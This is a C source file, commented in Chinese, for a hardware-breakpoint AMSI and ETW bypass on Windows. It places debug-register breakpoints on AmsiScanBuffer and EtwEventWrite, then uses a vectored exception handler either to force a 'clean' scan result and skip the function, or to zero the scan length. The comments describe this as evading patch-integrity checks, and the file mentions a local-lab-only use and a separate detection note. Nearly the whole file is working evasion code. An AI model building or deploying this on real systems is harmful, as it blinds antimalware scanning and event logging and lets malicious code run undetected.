// 硬件断点拦截完整实现（Bindseid 路线家族）：多目标 Dr 断点 + VEH 短路/改参两形态
//
// 用法：hwbp.exe [mode]
//   mode 0（默认）：短路式——Dr0=AmsiScanBuffer、Dr1=EtwEventWrite，命中即
//                   改 Rax=0 + 置结果指针 AMSI_RESULT_CLEAN，RIP 直跳返回地址
//                   （不进入被拦函数——零代码字节改动，对抗补丁完整性校验）
//   mode 1        ：改参续行式——Dr0=AmsiScanBuffer 命中后把 r8（length）清零，
//                   清该断点位 + 置 TF 单步；SINGLE_STEP 里重挂断点位、清 TF，
//                   函数照常执行完毕（扫描长度为 0 → 无扫描即返回 S_OK）
// 硬件断点要点：断点命中时指令**未执行**——短路式必须手动推进 RIP；续行式必须
// 先摘断点再放行，否则同地址死循环触发。
// 构建：x86_64-w64-mingw32-gcc -mwindows -o hwbp.exe hwbp.c
// 检测侧配对见 NOTES.md；仅本地实验环境使用
#include <windows.h>
#include <stdio.h>

static ULONG64 g_target[2];   /* 0=AmsiScanBuffer 1=EtwEventWrite */
static int     g_mode = 0;
static int     g_rearm = 0;   /* 续行式：单步后重挂哪个位（0/1=Dr0/Dr1） */

/* Dr7 位布局（局部断点）：Dr0 enable=bit0，Dr1 enable=bit2；断点条件读改写=bit16-17（Dr0）
 * 长度=bit18-19（Dr0）。简化：一律 RW=0（执行断点）、LEN=0（1 字节）。 */
static void arm(CONTEXT* c, int slot, ULONG64 addr) {
    if (slot == 0) { c->Dr0 = addr; c->Dr7 |= 1; }
    else           { c->Dr1 = addr; c->Dr7 |= 4; }
}
static void disarm(CONTEXT* c, int slot) {
    c->Dr7 &= ~(slot == 0 ? 1 : 4);
}

static LONG WINAPI veh(EXCEPTION_POINTERS* ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    CONTEXT* c = ep->ContextRecord;
    if (code != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;   /* 非单步异常一律外抛 */
    /* 注意：Dr 断点与 TF 单步都投递 EXCEPTION_SINGLE_STEP——先按 Rip 区分命中目标 */
    c->Dr6 = 0;                             /* 清断点状态位，防判定残留 */

    if (c->Rip == g_target[0]) {            /* AmsiScanBuffer 命中 */
        if (g_mode == 0) {
            /* 短路式：Rax=S_OK + 置结果 AMSI_RESULT_CLEAN，RIP 直跳返回地址 */
            c->Rax = 0;
            ULONG64* result = (ULONG64*)*(ULONG64*)(c->Rsp + 0x30);/* 第 6 参 AMSI_RESULT* */
            if (result) *result = 0;
            c->Rip = *(ULONG64*)(c->Rsp);
            c->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        /* 改参续行式：r8=length 清零 → 摘断点位 + TF 单步 → 函数正常执行返回 */
        c->R8 = 0;
        disarm(c, 0); g_rearm = 0;
        c->EFlags |= 0x100UL;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (g_mode == 0 && c->Rip == g_target[1]) {   /* EtwEventWrite 命中（短路式） */
        c->Rax = 0;
        c->Rip = *(ULONG64*)(c->Rsp);
        c->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    /* 纯 TF 单步（续行式重挂点）：恢复断点位、清 TF、放行 */
    if (g_mode == 1) { c->Dr7 |= (g_rearm == 0 ? 1 : 4); c->EFlags &= ~0x100UL; }
    return EXCEPTION_CONTINUE_EXECUTION;
}

int main(int argc, char** argv) {
    g_mode = (argc > 1) ? atoi(argv[1]) : 0;
    if (g_mode != 0 && g_mode != 1) { printf("[-] 未知 mode %d（0/1）\n", g_mode); return 3; }

    AddVectoredExceptionHandler(1, veh);

    HMODULE amsi = LoadLibraryA("amsi.dll");
    HMODULE nt   = GetModuleHandleA("ntdll.dll");
    g_target[0] = (ULONG64)GetProcAddress(amsi, "AmsiScanBuffer");
    g_target[1] = (ULONG64)GetProcAddress(nt, "EtwEventWrite");
    if (!g_target[0] || !g_target[1]) { printf("[-] 目标函数未定位\n"); return 1; }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL;   /* EFlags 一并读写 */
    GetThreadContext(GetCurrentThread(), &ctx);
    arm(&ctx, 0, g_target[0]);
    if (g_mode == 0) arm(&ctx, 1, g_target[1]);                    /* 多断点：AMSI+ETW 同挂 */
    ctx.Dr7 &= ~0x300;                                             /* RW 位清零=执行断点 */
    SetThreadContext(GetCurrentThread(), &ctx);

    printf("[+] hwbp mode=%d：Dr0=AmsiScanBuffer(%p)%s VEH 挂载\n", g_mode,
           (void*)g_target[0], g_mode == 0 ? " Dr1=EtwEventWrite" : "");
    /* 自测（本地实验）：触发一次扫描路径（无害 echo） */
    system("echo [test] probe");
    return 0;
}
